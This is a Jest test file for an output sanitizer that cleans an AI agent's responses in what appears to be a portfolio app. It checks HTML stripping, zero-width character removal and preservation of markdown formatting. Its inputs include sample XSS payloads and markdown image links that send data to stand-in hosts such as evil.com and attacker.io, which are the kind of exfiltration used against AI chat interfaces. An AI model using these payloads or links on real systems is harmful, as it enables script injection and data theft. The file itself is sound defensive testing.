import { sanitizeAgentResponse } from './output-sanitizer';

describe('sanitizeAgentResponse', () => {
  describe('HTML stripping', () => {
    it('strips <script> tags and their content', () => {
      expect(sanitizeAgentResponse('<script>alert(1)</script>Hello')).toBe(
        'Hello'
      );
    });

    it('strips <script> with attributes', () => {
      expect(
        sanitizeAgentResponse(
          '<script type="text/javascript">evil()</script>safe'
        )
      ).toBe('safe');
    });

    it('strips <img> tags', () => {
      expect(sanitizeAgentResponse('Before <img src="x"> after')).toBe(
        'Before  after'
      );
    });

    it('strips <img onerror> XSS vector', () => {
      expect(
        sanitizeAgentResponse('<img src="x" onerror="alert(1)">text')
      ).toBe('text');
    });

    it('strips <iframe> tags', () => {
      expect(
        sanitizeAgentResponse('<iframe src="evil.com"></iframe>text')
      ).toBe('text');
    });

    it('strips <a href> tags but keeps the text', () => {
      expect(
        sanitizeAgentResponse('Click <a href="evil.com">here</a> please')
      ).toBe('Click here please');
    });

    it('strips <style> tags and their content', () => {
      expect(sanitizeAgentResponse('<style>body{color:red}</style>text')).toBe(
        'text'
      );
    });

    it('strips inline event handlers on any tag', () => {
      expect(
        sanitizeAgentResponse('<div onmouseover="evil()">text</div>')
      ).toBe('text');
    });

    it('handles uppercase HTML tags', () => {
      expect(sanitizeAgentResponse('<SCRIPT>alert(1)</SCRIPT>safe')).toBe(
        'safe'
      );
    });
  });

  describe('markdown exfiltration link neutralization', () => {
    it('removes markdown image links that reference external URLs', () => {
      const input = '![stolen data](https://evil.com/?data=secret)';
      const result = sanitizeAgentResponse(input);
      expect(result).not.toContain('https://evil.com');
      expect(result).not.toContain('![');
    });

    it('removes markdown image links with http', () => {
      const input = 'text ![x](http://attacker.io/steal) more';
      const result = sanitizeAgentResponse(input);
      expect(result).not.toContain('http://attacker.io');
    });

    it('preserves normal markdown text that is not an image link', () => {
      expect(sanitizeAgentResponse('**bold** and _italic_')).toBe(
        '**bold** and _italic_'
      );
    });
  });

  describe('zero-width character removal', () => {
    it('removes zero-width space (U+200B)', () => {
      const input = 'Hello\u200BWorld';
      expect(sanitizeAgentResponse(input)).toBe('HelloWorld');
    });

    it('removes zero-width no-break space / BOM (U+FEFF)', () => {
      const input = '\uFEFFHello';
      expect(sanitizeAgentResponse(input)).toBe('Hello');
    });

    it('removes zero-width non-joiner (U+200C)', () => {
      const input = 'Hello\u200CWorld';
      expect(sanitizeAgentResponse(input)).toBe('HelloWorld');
    });

    it('removes zero-width joiner (U+200D)', () => {
      const input = 'Hello\u200DWorld';
      expect(sanitizeAgentResponse(input)).toBe('HelloWorld');
    });

    it('removes soft hyphen (U+00AD)', () => {
      const input = 'port\u00ADfolio';
      expect(sanitizeAgentResponse(input)).toBe('portfolio');
    });
  });

  describe('markdown preservation', () => {
    it('preserves bold text', () => {
      expect(sanitizeAgentResponse('**Total value: $50,000**')).toBe(
        '**Total value: $50,000**'
      );
    });

    it('preserves italic text', () => {
      expect(sanitizeAgentResponse('_Note: this is approximate_')).toBe(
        '_Note: this is approximate_'
      );
    });

    it('preserves markdown tables', () => {
      const table = '| Symbol | Value |\n| --- | --- |\n| AAPL | $1000 |';
      expect(sanitizeAgentResponse(table)).toBe(table);
    });

    it('preserves bullet lists', () => {
      const list = '- Item 1\n- Item 2\n- Item 3';
      expect(sanitizeAgentResponse(list)).toBe(list);
    });

    it('preserves numbered lists', () => {
      const list = '1. First\n2. Second\n3. Third';
      expect(sanitizeAgentResponse(list)).toBe(list);
    });

    it('preserves code blocks', () => {
      const code = '```json\n{"value": 100}\n```';
      expect(sanitizeAgentResponse(code)).toBe(code);
    });

    it('preserves headings', () => {
      expect(sanitizeAgentResponse('## Portfolio Summary')).toBe(
        '## Portfolio Summary'
      );
    });

    it('preserves normal financial text unmodified', () => {
      const text =
        'Your portfolio returned **12.5%** YTD. Top holding: AAPL at 25% allocation.';
      expect(sanitizeAgentResponse(text)).toBe(text);
    });

    it('preserves percentage signs, dollar signs, and commas', () => {
      const text = 'Value: $123,456.78 (up 4.2%)';
      expect(sanitizeAgentResponse(text)).toBe(text);
    });
  });

  describe('edge cases', () => {
    it('returns empty string unchanged', () => {
      expect(sanitizeAgentResponse('')).toBe('');
    });

    it('handles text with no dangerous content unchanged', () => {
      const safe = 'This is a safe response about your portfolio.';
      expect(sanitizeAgentResponse(safe)).toBe(safe);
    });

    it('handles combined threats in one string', () => {
      const input =
        '<script>steal()</script>**Safe content** ![x](https://evil.com/)\u200BHello';
      const result = sanitizeAgentResponse(input);
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('evil.com');
      expect(result).not.toContain('\u200B');
      expect(result).toContain('**Safe content**');
      expect(result).toContain('Hello');
    });
  });
});
